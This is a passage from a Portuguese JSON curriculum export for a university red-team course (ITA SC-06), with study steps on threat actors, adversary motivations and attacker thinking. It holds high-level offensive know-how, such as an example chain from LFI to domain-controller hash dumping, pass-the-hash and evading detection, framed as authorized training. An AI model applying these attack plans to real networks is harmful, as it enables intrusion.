{
  "formatVersion": "1.0",
  "exportDate": "2025-12-05T00:36:45.271Z",
  "appVersion": "1.0",
  "curriculumData": {
    "metadata": {
      "baseOn": "Catálogo dos Cursos de Graduação 2025 - SC-06",
      "lastUpdated": "2025-12-05",
      "totalAtomicSkills": 328,
      "startDate": "2025-02-01",
      "duration": "5 anos",
      "dailyStudyHours": 8,
      "version": "2025-SC-06",
      "institution": "Instituto Tecnológico de Aeronáutica (ITA)",
      "basedOn": "Catálogo dos Cursos de Graduação 2025 - SC-06"
    },
    "areas": [
      {
        "id": "10",
        "name": "Segurança Cibernética",
        "description": "Área dedicada a operações ofensivas e defensivas em ambientes cibernéticos, incluindo jogos de guerra cibernética.",
        "disciplines": [
          {
            "id": "10.1",
            "name": "SC-06 - Operações Cibernéticas e Jogos de Guerra Cibernética: Visão Ataque",
            "description": "Carga horária 2-0-2-3. Introdução à Segurança Cibernética, Mindset do Adversário, Organização do Red Team, Consciência Situacional, Regras de Engajamento, Planejamento e Criação de Cenários de Ameaça, Indicadores de Compromisso, Conceitos de Comando e Controle Cibernético, Ferramentas de Ethical Hacking / Pivoting e Persistência, Artigos Científicos na Área de Ofensiva Cibernética. Montagem de Ambientes de Jogos Cibernéticos para Red Team.",
            "mainTopics": [
              {
                "id": "10.1.1",
                "name": "Introdução à Segurança Cibernética",
                "description": "Apresenta os fundamentos da segurança cibernética e conceitos iniciais relacionados à visão de ataque.",
                "totalSkills": 51,
                "atomicTopics": [
                  {
                    "id": "10.1.1.1",
                    "name": "Mindset do Adversário",
                    "description": "Mentalidade e perspectiva do atacante cibernético na visão ofensiva.",
                    "individualConcepts": [
                      {
                        "id": "2.0.2.3.1",
                        "name": "Motivações e Objetivos do Adversário",
                        "description": "Compreender as razões que impulsionam atacantes cibernéticos, incluindo ganho financeiro, espionagem estatal, ativismo hacktivista ou vingança pessoal, conforme discutido em guias de Red Team como VEST e TUBBERVILLE (2000).",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.1.1",
                            "name": "Identificar Tipos de Atores de Ameaça",
                            "description": "Classificar atores como cibercriminosos, grupos patrocinados por estados, insiders maliciosos ou hackers independentes, analisando exemplos reais de campanhas ofensivas para prever comportamentos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender Definições e Características dos Tipos de Atores de Ameaça",
                                  "subSteps": [
                                    "Pesquise definições padrão de cibercriminosos, grupos patrocinados por estados, insiders maliciosos e hackers independentes usando fontes confiáveis como MITRE ATT&CK.",
                                    "Liste características únicas de cada tipo, como motivações (financeira, espionagem, sabotagem), recursos disponíveis e táticas comuns.",
                                    "Crie uma tabela comparativa destacando diferenças em alvos, persistência e impacto.",
                                    "Revise exemplos iniciais de cada categoria para fixar conceitos.",
                                    "Discuta em fóruns ou com pares para esclarecer dúvidas."
                                  ],
                                  "verification": "Tabela comparativa completa com pelo menos 5 características por tipo, revisada e sem erros factuais.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Framework",
                                    "Relatórios da Cybersecurity and Infrastructure Security Agency (CISA)",
                                    "Notebook ou planilha digital"
                                  ],
                                  "tips": "Use cores na tabela para diferenciar tipos visualmente e facilitar memorização.",
                                  "learningObjective": "Dominar definições e características distintivas dos quatro tipos principais de atores de ameaça cibernética.",
                                  "commonMistakes": [
                                    "Confundir motivações financeiras de cibercriminosos com espionagem estatal",
                                    "Ignorar recursos avançados de grupos estatais",
                                    "Subestimar o impacto de insiders devido à proximidade interna"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Exemplos Reais de Campanhas Ofensivas",
                                  "subSteps": [
                                    "Selecione 2-3 campanhas reais por tipo (ex: Ransomware como Conti para cibercriminosos, SolarWinds para grupos estatais).",
                                    "Leia relatórios detalhados e extraia evidências de motivação, táticas e atribução.",
                                    "Mapeie cada campanha para o tipo de ator usando a tabela do Step 1.",
                                    "Identifique padrões recorrentes em TTPs (Tactics, Techniques, Procedures).",
                                    "Documente lições aprendidas de cada exemplo."
                                  ],
                                  "verification": "Relatório de 1 página por campanha com mapeamento correto e evidências citadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Relatórios de incidentes da Mandiant ou CrowdStrike",
                                    "Base de dados de ameaças como AlienVault OTX",
                                    "Ferramentas de anotações como Notion"
                                  ],
                                  "tips": "Comece com casos famosos para construir confiança antes de exemplos obscuros.",
                                  "learningObjective": "Aplicar conhecimentos teóricos a incidentes reais para reforçar identificação de atores.",
                                  "commonMistakes": [
                                    "Atribuir incorretamente campanhas estatais a criminosos independentes",
                                    "Não citar fontes primárias",
                                    "Focar apenas em um tipo de ator"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Praticar Classificação de Novos Cenários",
                                  "subSteps": [
                                    "Crie ou encontre 5 cenários hipotéticos ou reais não estudados anteriormente.",
                                    "Analise cada um: motive-se pela descrição, TTPs e contexto para classificar o ator.",
                                    "Justifique a classificação com evidências da análise.",
                                    "Compare com respostas de especialistas ou ferramentas de threat intel.",
                                    "Ajuste classificações baseadas em feedback."
                                  ],
                                  "verification": "Portfolio de 5 classificações com justificativas de pelo menos 100 palavras cada, acurácia >80%.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": [
                                    "Cenários de CTFs como TryHackMe",
                                    "Ferramentas como MISP para threat intel",
                                    "Templates de análise em Google Docs"
                                  ],
                                  "tips": "Use o framework Diamond Model para estruturar análises sistematicamente.",
                                  "learningObjective": "Desenvolver habilidade de classificar atores em cenários variados com alta precisão.",
                                  "commonMistakes": [
                                    "Classificar baseado apenas em malware, ignorando contexto",
                                    "Não considerar evolução de TTPs ao longo do tempo",
                                    "Sobrecarregar análise com detalhes irrelevantes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Prever Comportamentos Futuros Baseados em Classificações",
                                  "subSteps": [
                                    "Para cada tipo de ator, liste 3-5 comportamentos prováveis futuros baseado em tendências históricas.",
                                    "Simule cenários: 'Se um insider malicioso for identificado, quais alvos ele priorizaria?'",
                                    "Crie um relatório de previsão com probabilidades qualitativas.",
                                    "Valide previsões contra relatórios recentes de threat hunting.",
                                    "Refine o modelo de previsão iterativamente."
                                  ],
                                  "verification": "Relatório de previsão com 4 seções (uma por tipo), incluindo pelo menos 3 previsões validadas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Tendências anuais da Verizon DBIR",
                                    "Ferramentas de modelagem como draw.io para diagramas",
                                    "Artigos de blogs de segurança como Krebs on Security"
                                  ],
                                  "tips": "Incorpore inteligência OSINT para tornar previsões mais realistas.",
                                  "learningObjective": "Capacitar previsão proativa de ameaças através da compreensão comportamental de atores.",
                                  "commonMistakes": [
                                    "Previsões genéricas sem base em dados históricos",
                                    "Ignorar adaptações de atores a defesas",
                                    "Confundir previsão com especulação sem evidências"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o ataque ao Colonial Pipeline (2021): Identifique o ator como cibercriminoso (DarkSide), motive-se pela extorsão financeira via ransomware, TTPs como double extortion, e preveja escalada para infraestruturas críticas semelhantes.",
                              "finalVerifications": [
                                "Classificar corretamente 90% dos 10 cenários de teste mistos.",
                                "Explicar diferenças entre atores em uma apresentação de 5 minutos.",
                                "Criar tabela comparativa precisa sem consulta.",
                                "Prever TTPs futuros para um ator dado com justificativa.",
                                "Identificar insider em cenário interno vs. externo.",
                                "Mapear campanha real a framework MITRE sem erros."
                              ],
                              "assessmentCriteria": [
                                "Precisão na classificação de atores (80%+ acurácia).",
                                "Profundidade de análise com evidências citadas.",
                                "Capacidade de previsão comportamental realista.",
                                "Uso correto de terminologia e frameworks.",
                                "Criatividade em conexões com exemplos reais.",
                                "Clareza e organização em relatórios e tabelas."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Análise de motivações humanas e perfis comportamentais.",
                                "História/Geopolítica: Contexto de conflitos estatais e ciberguerra.",
                                "Estatística: Probabilidades em previsões de ameaças.",
                                "Ética: Discussão sobre insiders e dilemas morais.",
                                "Negócios: Impacto econômico de ataques criminosos."
                              ],
                              "realWorldApplication": "Em equipes de SOC ou threat intelligence, use essa habilidade para priorizar defesas, atribuir incidentes rapidamente e antecipar ataques, reduzindo tempo de resposta em horas para minutos em operações de cibersegurança corporativa ou governamental."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.1.2",
                            "name": "Analisar Objetivos Primários e Secundários",
                            "description": "Diferenciar metas imediatas (ex.: roubo de dados) de objetivos de longo prazo (ex.: persistência na rede), utilizando frameworks como o Cyber Kill Chain para mapear intenções.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir Conceitos de Objetivos Primários e Secundários",
                                  "subSteps": [
                                    "Pesquise definições de objetivos primários (metas imediatas, ex.: roubo de dados) e secundários (longo prazo, ex.: persistência na rede).",
                                    "Identifique exemplos reais de ataques cibernéticos, como WannaCry (primário: criptografia; secundário: propagação).",
                                    "Crie um glossário pessoal com 5 pares de exemplos primário/secundário.",
                                    "Compare objetivos com TTPs (Tactics, Techniques, Procedures).",
                                    "Discuta em fórum ou anote como objetivos evoluem durante um ataque."
                                  ],
                                  "verification": "Glossário completo com exemplos validados contra fontes confiáveis como MITRE ATT&CK.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Notebook, acesso a MITRE ATT&CK Navigator, artigos sobre ciberataques famosos.",
                                  "tips": "Use diagramas Venn para visualizar sobreposições entre primário e secundário.",
                                  "learningObjective": "Compreender a distinção conceitual entre objetivos imediatos e de longo prazo no contexto de ameaças cibernéticas.",
                                  "commonMistakes": "Confundir objetivos com técnicas específicas; ignorar evolução temporal dos objetivos."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar o Framework Cyber Kill Chain",
                                  "subSteps": [
                                    "Assista vídeo explicativo do Cyber Kill Chain (7 fases: Recon, Weaponization, etc.).",
                                    "Mapeie cada fase a possíveis objetivos primários/secundários com exemplos.",
                                    "Baixe template do Kill Chain e preencha com anotações pessoais.",
                                    "Compare com outros frameworks como MITRE ATT&CK para similaridades.",
                                    "Resuma em mindmap as conexões entre fases e objetivos adversários."
                                  ],
                                  "verification": "Mindmap completa com pelo menos 3 exemplos por fase, revisada por pares ou autoavaliação.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Vídeo Lockheed Martin Cyber Kill Chain, MITRE ATT&CK site, ferramenta de mindmapping (ex.: XMind).",
                                  "tips": "Associe fases a verbos de ação para memorizar (ex.: Recon = 'Explorar').",
                                  "learningObjective": "Dominar o Cyber Kill Chain como ferramenta para mapear intenções adversárias ao longo do ciclo de ataque.",
                                  "commonMistakes": "Tratar Kill Chain como linear; subestimar sobreposições entre fases."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Caso Real Usando o Framework",
                                  "subSteps": [
                                    "Escolha um caso estudo (ex.: SolarWinds: primário roubo dados, secundário persistência).",
                                    "Mapeie o ataque no Cyber Kill Chain, identificando objetivos por fase.",
                                    "Classifique objetivos como primários/secundários com evidências do caso.",
                                    "Identifique pivôs onde objetivos mudaram (ex.: de exfiltração para C2).",
                                    "Escreva relatório de 1 página resumindo a análise."
                                  ],
                                  "verification": "Relatório com mapeamento completo e citações de fontes primárias.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Relatórios de incidentes (SolarWinds FireEye), Cyber Kill Chain template.",
                                  "tips": "Use cores no mapeamento: vermelho para primário, azul para secundário.",
                                  "learningObjective": "Aplicar Cyber Kill Chain para diferenciar e mapear objetivos em ataques históricos.",
                                  "commonMistakes": "Focar só em técnicas, ignorando intenções estratégicas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar Análise em Cenário Simulado",
                                  "subSteps": [
                                    "Crie ou use cenário hipotético (ex.: phishing levando a ransomware).",
                                    "Mapeie Kill Chain e classifique 5+ objetivos primários/secundários.",
                                    "Simule detecção: onde intervir para frustrar objetivos.",
                                    "Revise análise com checklist de completude.",
                                    "Apresente findings em slide ou vídeo curto (2 min)."
                                  ],
                                  "verification": "Análise simulada com pelo menos 80% de cobertura das fases do Kill Chain.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Ferramentas de simulação (ex.: Atomic Red Team), Google Slides.",
                                  "tips": "Pense como adversário: 'Qual meu ganho primário? Como sustento?'",
                                  "learningObjective": "Desenvolver habilidade prática de análise autônoma de intenções adversárias.",
                                  "commonMistakes": "Assumir objetivos estáticos; não considerar defesas."
                                }
                              ],
                              "practicalExample": "No ataque SolarWinds (2020), objetivo primário na fase de Delivery foi implantar backdoor para roubo inicial de dados; secundário na Actions on Objectives foi estabelecer persistência para espionagem contínua, mapeado via Cyber Kill Chain.",
                              "finalVerifications": [
                                "Diferencia corretamente 5 exemplos de objetivos primários vs. secundários.",
                                "Mapeia fluentemente um ataque completo no Cyber Kill Chain.",
                                "Identifica pivôs de objetivos em casos reais com evidências.",
                                "Explica conexões entre objetivos e fases do Kill Chain.",
                                "Aplica análise a cenários novos sem orientação.",
                                "Valida análise contra frameworks como MITRE ATT&CK."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção primário/secundário (90%+ acurácia).",
                                "Uso integral e correto do Cyber Kill Chain (todas fases cobertas).",
                                "Profundidade de evidências e exemplos concretos.",
                                "Clareza na comunicação da análise (diagramas/relatórios).",
                                "Criatividade em cenários simulados e conexões estratégicas.",
                                "Identificação de erros comuns e mitigação."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Análise de motivações humanas por trás de objetivos adversários.",
                                "Estratégia Militar: Paralelos com doutrinas de campanha (ex.: OODA Loop).",
                                "Análise de Negócios: Mapeamento de ROI adversário em ataques.",
                                "Inteligência: Técnicas de OSINT para validar objetivos."
                              ],
                              "realWorldApplication": "Em um SOC, usar essa análise para priorizar alertas em threat hunting, prevendo movimentos adversários além de IOCs imediatos, como em respostas a APTs estatais."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.1.3",
                            "name": "Avaliar Impactos de Diferentes Motivações",
                            "description": "Examinar como motivações influenciam táticas, como ataques rápidos para lucro versus infiltrações stealth para espionagem, com base em casos de ethical hacking de SIMPSON et al. (2010).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar Motivações Comuns de Adversários Cibernéticos",
                                  "subSteps": [
                                    "Liste as principais motivações: financeira (lucro), espionagem (informações), ideológica (hacktivismo), disruptiva (danos) e state-sponsored (geopolítica).",
                                    "Pesquise exemplos reais para cada motivação usando fontes como relatórios da Verizon DBIR ou MITRE ATT&CK.",
                                    "Classifique motivações por frequência e impacto com base em estatísticas recentes.",
                                    "Crie um mapa mental conectando motivações a perfis de atacantes (ex: cibercriminosos vs. nações-estado).",
                                    "Discuta como motivações evoluem com o tempo (ex: ransomware como serviço)."
                                  ],
                                  "verification": "Verifique se o aluno pode listar e exemplificar pelo menos 5 motivações com fontes citadas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Artigo de SIMPSON et al. (2010)",
                                    "MITRE ATT&CK Framework",
                                    "Verizon DBIR relatório anual"
                                  ],
                                  "tips": "Use frameworks como Diamond Model para contextualizar motivações.",
                                  "learningObjective": "Compreender o espectro de motivações que impulsionam ações cibernéticas adversárias.",
                                  "commonMistakes": [
                                    "Confundir motivação com tática",
                                    "Ignorar motivações emergentes como ciberguerra híbrida"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Motivações para Táticas e Técnicas Específicas",
                                  "subSteps": [
                                    "Para motivação financeira: associe a ataques rápidos como phishing e ransomware.",
                                    "Para espionagem: relacione a infiltrações stealth como APTs com living-off-the-land.",
                                    "Compare velocidades: ataques financeiros priorizam volume vs. espionagem foca em persistência.",
                                    "Use matriz para mapear: linhas=motivações, colunas=táticas (ex: DDoS para disruptiva).",
                                    "Simule cenários: 'Se motivação for lucro, qual TTP do MITRE?'."
                                  ],
                                  "verification": "Aluno deve preencher uma matriz completa com pelo menos 4 motivações e 3 táticas cada.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "SIMPSON et al. (2010) casos de ethical hacking",
                                    "Ferramenta de mind mapping como XMind"
                                  ],
                                  "tips": "Priorize táticas baseadas em evidências de ethical hacking simulations.",
                                  "learningObjective": "Associar logicamente motivações a padrões táticos observados.",
                                  "commonMistakes": [
                                    "Generalizar todas as motivações como 'roubo de dados'",
                                    "Não diferenciar entre táticas iniciais e de manutenção"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Casos de Estudo de Ethical Hacking",
                                  "subSteps": [
                                    "Estude casos de SIMPSON et al. (2010): compare simulações de ataques rápidos vs. stealth.",
                                    "Analise WannaCry (financeira: propagação rápida) vs. Stuxnet (espionagem: infiltração lenta).",
                                    "Identifique impactos: detecção, danos, tempo de dwell.",
                                    "Extraia lições: como motivação afeta choice de exploits e C2.",
                                    "Registre em tabela: motivação, tática, impacto mensurado."
                                  ],
                                  "verification": "Relatório de análise de 2 casos com tabela comparativa e citações.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Paper SIMPSON et al. (2010)",
                                    "Relatórios de incidentes WannaCry/Stuxnet",
                                    "Kaspersky Threat Intelligence"
                                  ],
                                  "tips": "Foque em métricas quantitativas como tempo de detecção.",
                                  "learningObjective": "Aplicar teoria a casos reais para observar correlações motivação-tática-impacto.",
                                  "commonMistakes": [
                                    "Focar só em sucesso do ataque, ignorar falhas",
                                    "Não contextualizar com ethical hacking"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar e Comparar Impactos das Motivações",
                                  "subSteps": [
                                    "Compare impactos: financeiro causa perdas imediatas vs. espionagem riscos de longo prazo.",
                                    "Avalie defesas: honeypots para rápidos vs. EDR para stealth.",
                                    "Preveja táticas futuras baseado em tendências (ex: IA em ataques motivados por lucro).",
                                    "Crie relatório executivo resumindo riscos por motivação.",
                                    "Debata em grupo: 'Qual motivação é mais perigosa hoje?'."
                                  ],
                                  "verification": "Relatório comparativo com recomendações defensivas para 3 motivações.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Templates de relatório de threat intel",
                                    "Ferramentas como Excel para tabelas comparativas"
                                  ],
                                  "tips": "Use escala de impacto (baixo/médio/alto) para objetividade.",
                                  "learningObjective": "Sintetizar análises para informar estratégias de defesa proativas.",
                                  "commonMistakes": [
                                    "Subestimar impactos intangíveis como perda de confiança",
                                    "Não considerar evolução de motivações"
                                  ]
                                }
                              ],
                              "practicalExample": "Analise o ransomware Ryuk (motivação financeira: ataque rápido para extorsão via RDP explorado) versus a campanha APT29 (espionagem: infiltração stealth via supply chain como SolarWinds), destacando diferenças em tempo de dwell (dias vs. meses) e táticas usadas.",
                              "finalVerifications": [
                                "Pode listar e exemplificar 5 motivações com táticas associadas.",
                                "Consegue mapear motivações a pelo menos 3 TTPs do MITRE ATT&CK.",
                                "Analisa corretamente 2 casos reais diferenciando impactos.",
                                "Propõe defesas específicas por motivação.",
                                "Compara qualitativa/quantitativamente impactos em relatório.",
                                "Identifica conexões de SIMPSON et al. (2010) em simulações."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de motivações e táticas (80% acerto).",
                                "Profundidade na análise de casos com evidências citadas.",
                                "Criatividade e relevância nas comparações de impactos.",
                                "Clareza e estrutura no mapeamento/matrice.",
                                "Aplicação prática de conceitos de ethical hacking.",
                                "Capacidade de prever defesas baseadas em motivações."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Teoria da motivação humana aplicada a perfis de atacantes.",
                                "Economia: Análise custo-benefício de táticas por motivação financeira.",
                                "Direito Internacional: Implicações de motivações state-sponsored.",
                                "Estratégia Militar: Paralelos com doutrinas de guerra assimétrica cibernética."
                              ],
                              "realWorldApplication": "Em um SOC, ao detectar um ataque rápido via phishing, inferir motivação financeira e priorizar contenção imediata; para tráfego stealth persistente, escalar para análise de APT e espionagem, otimizando respostas como em equipes de threat hunting de empresas como Mandiant."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "2.0.2.3.2",
                        "name": "Perspectiva Ofensiva do Atacante",
                        "description": "Adotar a visão do atacante para identificar fraquezas defensivas, enfatizando a inversão de papéis do defensor para simular decisões reais em operações Red Team.",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.2.1",
                            "name": "Pensar como um Atacante em Cenários Hipotéticos",
                            "description": "Simular o raciocínio de um adversário ao explorar uma rede vulnerável, priorizando caminhos de menor resistência e oportunidades de pivoting.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definir e Mapear o Cenário Hipotético",
                                  "subSteps": [
                                    "Descreva o ambiente alvo: rede, hosts, serviços expostos e usuários potenciais.",
                                    "Identifique ativos críticos (ex.: servidores de banco de dados, controladores de domínio).",
                                    "Crie um diagrama simples da topologia de rede usando ferramentas como Draw.io.",
                                    "Liste suposições realistas sobre configurações de segurança (firewalls, patches ausentes).",
                                    "Defina objetivos do atacante (ex.: roubo de dados, ransomware)."
                                  ],
                                  "verification": "Verifique se o diagrama inclui pelo menos 5 ativos e 3 caminhos de acesso potenciais.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Papel e caneta ou ferramenta de diagramação (Draw.io, Lucidchart)",
                                    "Documentação de cenários comuns de redes (OWASP, MITRE ATT&CK)"
                                  ],
                                  "tips": "Comece com cenários simples para construir confiança antes de complexos.",
                                  "learningObjective": "Capacitar o aluno a visualizar e documentar um ambiente de rede hipotético de forma estruturada.",
                                  "commonMistakes": [
                                    "Ignorar ativos internos não expostos",
                                    "Fazer suposições irrealistas sobre segurança perfeita",
                                    "Esquecer de definir objetivos claros do atacante"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Adotar a Mentalidade do Atacante: Objetivos e Motivações",
                                  "subSteps": [
                                    "Pergunte: 'Qual é meu objetivo final e por quê?' (ex.: acesso privilegiado por ganho financeiro).",
                                    "Liste motivações: tempo limitado, detecção mínima, custo baixo.",
                                    "Priorize alvos baseados em valor vs. esforço (matriz de risco).",
                                    "Simule trade-offs: atacar via web app vs. phishing vs. engenharia social.",
                                    "Documente personas de atacantes (script kiddie vs. APT)."
                                  ],
                                  "verification": "Crie uma matriz 2x2 de alvos (alto valor/baixo esforço) com pelo menos 4 entradas priorizadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Planilha Excel ou Google Sheets para matriz de priorização",
                                    "Referências MITRE ATT&CK para táticas de adversários"
                                  ],
                                  "tips": "Pense como um ladrão físico: entre pela janela aberta, não pela porta trancada.",
                                  "learningObjective": "Desenvolver empatia com o mindset ofensivo, focando em eficiência e stealth.",
                                  "commonMistakes": [
                                    "Focar só em ataques 'cool' em vez de viáveis",
                                    "Subestimar detecção",
                                    "Não considerar limitações do atacante"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar Caminhos de Menor Resistência e Vulnerabilidades",
                                  "subSteps": [
                                    "Simule reconnaissance: liste serviços expostos (ex.: porta 80/443 aberta).",
                                    "Avalie vulnerabilidades comuns: SQLi, RCE, credenciais fracas.",
                                    "Classifique caminhos por facilidade: externo > pivô interno.",
                                    "Use frameworks como OWASP Top 10 ou CVE para brainstorm.",
                                    "Ordene caminhos em uma lista priorizada com probabilidades estimadas."
                                  ],
                                  "verification": "Gere uma lista de 5-7 caminhos com scores de viabilidade (1-10) e justifique os top 3.",
                                  "estimatedTime": "1 hora e 30 minutos",
                                  "materials": [
                                    "Lista de CVEs recentes (cve.mitre.org)",
                                    "Ferramentas de simulação como OWASP Juice Shop (ambiente virtual)"
                                  ],
                                  "tips": "Pergunte sempre: 'Qual o caminho que um atacante preguiçoso tomaria primeiro?'",
                                  "learningObjective": "Treinar identificação sistemática de fraquezas exploráveis em ordem de preferência.",
                                  "commonMistakes": [
                                    "Listar vulnerabilidades sem contexto de rede",
                                    "Ignorar defesas como WAF",
                                    "Priorizar complexidade sobre simplicidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular Pivoting e Escalada de Privilégios",
                                  "subSteps": [
                                    "Do foothold inicial (ex.: shell via web vuln), liste pivôs: lateral (mesma rede), vertical (privilégios).",
                                    "Planeje chains: exploit1 -> hashdump -> pass-the-hash -> DC.",
                                    "Considere detecção: use living-off-the-land binaries (LOLBins).",
                                    "Itere: simule falhas e adapte (ex.: pivô falha, tente outro).",
                                    "Documente o caminho completo em um fluxograma de ataque."
                                  ],
                                  "verification": "Crie um fluxograma com pelo menos 3 pivôs e 2 contingências para falhas.",
                                  "estimatedTime": "1 hora e 15 minutos",
                                  "materials": [
                                    "Ferramenta de fluxograma (Draw.io)",
                                    "Labs virtuais como TryHackMe ou HackTheBox (modo observação)"
                                  ],
                                  "tips": "Pivoting é como navegar um labirinto: sempre procure portas adjacentes.",
                                  "learningObjective": "Capacitar planejamento de ataques multi-estágio com adaptação dinâmica.",
                                  "commonMistakes": [
                                    "Planejar pivôs sem foothold viável",
                                    "Esquecer limpeza de rastros",
                                    "Não planejar backups para detecção"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar, Refinar e Documentar a Estratégia",
                                  "subSteps": [
                                    "Revise o plano: tempo total, riscos de detecção, sucesso provável.",
                                    "Identifique defesas que bloqueariam e contramedidas.",
                                    "Simule defesa: como blue team detectaria? Ajuste para stealth.",
                                    "Escreva relatório de 'ataque' com lições.",
                                    "Compare com ataques reais (ex.: SolarWinds)."
                                  ],
                                  "verification": "Produza um relatório de 1 página resumindo estratégia, riscos e mitigações.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Templates de relatórios de pentest (SANS ou CREST)",
                                    "Casos de estudo (MITRE Engage)"
                                  ],
                                  "tips": "Sempre termine pensando 'defesa': como mitigar isso?",
                                  "learningObjective": "Integrar análise crítica para refinar simulações em estratégias robustas.",
                                  "commonMistakes": [
                                    "Não quantificar riscos",
                                    "Ignorar perspectiva defensiva",
                                    "Relatório vago sem métricas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma rede corporativa hipotética, um servidor web público (IP 192.168.1.10) roda uma app vulnerável a LFI. Ataque: 1) Exploração LFI para shell. 2) Enumeração interna revela DC (192.168.1.5) com SMB aberto. 3) Pivô via SMB relay para credenciais admin. 4) Escalada ao DC para dump de hashes. Prioridade: caminho web->SMB por baixa resistência vs. tentar RDP direto.",
                              "finalVerifications": [
                                "Pode mapear um cenário com diagrama e priorizar 3 caminhos de ataque.",
                                "Descreve pivoting com exemplos concretos de ferramentas/técnicas.",
                                "Identifica erros comuns em simulações e como evitá-los.",
                                "Produz relatório de estratégia com mitigações defensivas.",
                                "Explica trade-offs de um ataque real vs. hipotético.",
                                "Simula iterações baseadas em falhas detectadas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de caminhos de menor resistência (80% alinhado com boas práticas).",
                                "Profundidade de substeps e verificações em cada step (mínimo 4 substeps por step).",
                                "Criatividade e realismo no practical example e pivoting.",
                                "Integração de mindset ofensivo com análise defensiva.",
                                "Qualidade do fluxograma/relatório: claro, conciso e acionável.",
                                "Cobertura de erros comuns e tips preventivos."
                              ],
                              "crossCurricularConnections": [
                                "Estratégia Militar: Planejamento de manobras (Sun Tzu's Art of War para caminhos de menor resistência).",
                                "Psicologia: Empatia e teoria da mente para adotar perspectivas adversárias.",
                                "Gestão de Projetos: Matrizes de risco e priorização (MoSCoW method).",
                                "Análise de Dados: Modelagem de probabilidades em ataques (Bayesiano).",
                                "Ética e Filosofia: Discussão de black hat vs. white hat mindsets."
                              ],
                              "realWorldApplication": "Pentesters e Red Teams usam esse mindset em engajamentos autorizados para simular APTs, identificando gaps antes de criminosos reais, como em exercícios de Capture The Flag (CTF) ou avaliações anuais de conformidade (ex.: PCI-DSS, NIST)."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.2.2",
                            "name": "Mapear Fraquezas a Partir da Ótica Ofensiva",
                            "description": "Identificar vetores de ataque comuns como phishing, exploits de software ou engenharia social, visualizando o ambiente como um atacante faria.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Adotar a Mentalidade do Atacante",
                                  "subSteps": [
                                    "Estude os objetivos típicos de um atacante: confidencialidade, integridade e disponibilidade (CID).",
                                    "Visualize o ambiente alvo como um 'terreno de caça': identifique entradas, saídas e pontos cegos.",
                                    "Pratique role-playing: pergunte 'Como eu entraria se fosse um hacker?' para cada componente do sistema.",
                                    "Analise casos reais de breaches famosos (ex: Equifax, SolarWinds) sob a ótica ofensiva.",
                                    "Registre insights iniciais em um diário de 'pensamento ofensivo'."
                                  ],
                                  "verification": "Criar um mapa mental com 5+ motivações e táticas de atacantes comuns.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Acesso à internet para cases de breaches",
                                    "Ferramenta de mind mapping (ex: MindMeister ou papel/caneta)"
                                  ],
                                  "tips": "Mantenha neutralidade emocional; foque em lógica fria do atacante.",
                                  "learningObjective": "Compreender e internalizar a perspectiva ofensiva para identificar oportunidades de ataque.",
                                  "commonMistakes": [
                                    "Focar apenas em tecnologia, ignorando fatores humanos",
                                    "Subestimar engenharia social como vetor principal"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
